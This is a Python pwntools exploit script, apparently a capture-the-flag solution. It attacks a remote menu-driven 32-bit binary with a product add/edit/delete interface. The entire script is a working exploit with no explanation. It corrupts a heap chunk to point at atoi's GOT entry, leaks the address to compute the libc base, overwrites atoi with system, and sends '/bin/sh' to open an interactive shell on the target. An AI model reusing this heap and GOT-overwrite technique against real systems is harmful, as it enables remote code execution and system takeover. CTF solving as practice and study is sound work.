from pwn import*
def add(name,size,des):
	p.sendlineafter('>> ','1')
	p.sendlineafter('name:',name)
	p.sendlineafter('price:','256')
	p.sendlineafter('size:',str(size))
	p.sendlineafter('description:',des)
def free(name):
	p.sendlineafter('>> ','2')
	p.sendlineafter('name:',name)
def show():
	p.sendlineafter('>> ','3')
def edit_p(name,cp):
	p.sendlineafter('>> ','4')
	p.sendlineafter('name:',name)
	p.sendlineafter('rise in:',str(cp))
def edit_des(name,size,des):
	p.sendlineafter('>> ','5')
	p.sendlineafter('name:',name)
	p.sendlineafter('descrip_size:',str(size))
	p.sendlineafter('description:',des)
p = remote('111.198.29.45',44827)
elf = ELF('./main')
libc = ELF('libc.so')
context.log_level ='debug'
add('I',0x88,'')
add('II',0x20,'')
edit_des('I',0xA0,'')
add('FMYY',0x90,'')
payload = 'FMYY' + '\x00'*12 + p32(0X200) + p32(0x90) + p32(elf.got['atoi'])
edit_des('I',0x88,payload)
show()
libc_base = u32(p.recvuntil('\xF7')[-4:]) - libc.sym['atoi']
log.info('Libc_Base:\t' + hex(libc_base))
system = libc_base + libc.sym['system']
edit_des('FMYY',0x90,p32(system))
p.sendlineafter('>> ','/bin/sh\x00')
p.interactive()
